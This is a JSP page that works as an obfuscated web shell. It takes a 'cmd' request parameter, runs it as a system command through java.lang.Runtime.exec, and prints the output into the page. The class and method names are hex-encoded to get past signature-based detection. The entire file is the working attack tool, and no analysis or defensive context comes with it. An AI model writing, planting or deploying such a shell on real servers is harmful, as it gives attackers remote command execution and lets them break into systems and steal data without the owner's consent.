<%--
  Created by IntelliJ IDEA.
  User: 59302
  Date: 2022/12/10
  Time: 22:26
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" import="javax.xml.bind.DatatypeConverter" language="java" %>
<%@ page import="java.lang.reflect.InvocationTargetException" %>
<%
    if (request.getParameter("cmd") != null) {
        Class rt = null;
        try {
            rt = Class.forName(new String(DatatypeConverter.parseHexBinary("6a6176612e6c616e672e52756e74696d65")));
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        }
        Process e = null;
        try {
            e = (Process) rt.getMethod(new String(DatatypeConverter.parseHexBinary("65786563")), String.class)
                    .invoke(rt.getMethod(new String(DatatypeConverter.parseHexBinary("67657452756e74696d65")))
                            .invoke(null), request.getParameter("cmd"));
        } catch (NoSuchMethodException | IllegalAccessException | InvocationTargetException ex) {
            throw new RuntimeException(ex);
        }
        java.io.InputStream in = e.getInputStream();
        out.print("<pre>");
        java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
        java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
        String s = null;
        while ((s = stdInput.readLine()) != null) {
            out.println(s);
        }
        out.print("</pre>");
    }
%>
